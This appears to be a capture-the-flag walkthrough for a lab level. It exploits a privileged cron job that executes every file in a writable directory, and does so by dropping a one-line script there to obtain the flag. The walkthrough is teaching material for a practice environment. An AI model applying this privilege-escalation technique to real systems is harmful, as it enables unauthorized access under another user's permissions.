When we log in we can see:

```
You have a new mail.
```

We have a file named level05 in /var/mail/level05:

```
$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Check the content of /usr/sbin/openarenaserver:

```
$ cat /usr/sbin/opearenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done 
```

This script iterate on every files in /opt/openarenaserver/ and execute it with the permissions of the crontab owner.
We need to create a little script to get the flag:

```
echo "getflag > /var/crash/flag" > /opt/openarenaserver/script
```

Wait 2 minutes and get the flag:

```
$ cat /var/crash/flag
Check flag.Here is your token : xxxxxxxxxxxxxxxxxxxxxxxxx
```
